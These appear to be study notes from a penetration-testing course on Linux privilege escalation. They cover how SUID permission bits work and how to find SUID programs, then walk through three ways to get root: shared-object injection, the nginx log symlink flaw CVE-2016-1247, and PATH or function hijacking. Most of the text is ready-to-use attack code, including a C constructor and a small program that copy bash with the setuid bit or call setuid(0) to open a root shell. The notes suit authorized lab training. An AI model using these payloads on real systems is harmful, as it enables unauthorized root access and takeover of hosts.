Set user id.
~~~
-rws------
   ^
~~~

~~~
drwxr-xr-x 10 TCM  user 4096 Jun 18  2020 tools

d > d: directory; f: file

file owner permissions (TCM)
r > 4 bits
w > 2 bits
x > 1 bit

group permissions  (user)
r > 4 bits
- > 2 bits
x > 1 bit

everyone else's permissions
r > 4 bits
- > 2 bits
x > 1 bit
~~~

~~~
chmod 777 file

output:
-rwxrwxrwx

7 = r (4 bits) + w (2 bits) + x (1 bit)
~~~

Finding SUID's:
~~~
find / -perm -u=s -type f 2>/dev/null
~~~
Search for the found programs on [GTFObins](https://gtfobins.github.io/)

---
# Escalation via Shared Object Injection

- Step 1 (Find SUID's):
	~~~
	find / -type f -perm -04000 -ls 2> /dev/null
	~~~
- Step 2 (Look for `so` programs)
- Step 3 (If found, give it to strace):
	~~~
	strace {so program} 2>&1 | grep -i -E "open|access|no such file"
	~~~
- Step 4 (Overwrite the shared object program):
	~~~
	touch {overwritable so file}.c
	~~~
	
	~~~c
	
	#include <stdlib.h>
	#include <stdio.h>

	static void inject() __attribute__((constructor));
	void inject() {
		system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
	}
	~~~

	~~~
	gcc -shared -fPIC -o {witeable directory}/{overwritable so file}.so {overwritable so file}.c
	~~~
- Step 5 (Run the so file)
	We get root access.

---
# Escalation via Binary Symlinks
Vulnerability with nginx, about the permissions of the logs of nginx.
We can escalate from www-data user to root.
[CVE-2016-1247](https://nvd.nist.gov/vuln/detail/CVE-2016-1247)
[writeup](https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html)

Look for version <=1.6.2
~~~
dpkg -l | grep nginx
~~~

SUID bit set on sudo is required.

Look for log files:
~~~
ls -al /var/log/nginx
~~~

Run the script:
~~~
./nginxed-root.sh /var/log/nginx/error.log
~~~

Connect to server and run
~~~
invoce-rc.d nginx rotate > /dev/null 2>&1
~~~

`The server is (N)jinxed ! ;) Got root via Nginx!`

---
# Escalation via Environment Variables
~~~
echo $PATH
~~~
Change where a program that has the SUID bit set is getting called from.

~~~
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/{program name that has the SUID set, or the program that is being called by the program that has its SUID bit set}.c
~~~

Let's put `/tmp` before all the other paths where the system might look for programs.
~~~
gcc /tmp/{our program}.c -o /tmp/{our program}
export PATH=/tmp:$PATH
~~~

Run the program.


What if the program with SUID bit calls a program with full path?

Create a malicious function:
~~~
function {the path that is being called by the program}() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
~~~

Export function (-f refers to shell function):
~~~
export -f {program with path}
~~~

Run the program.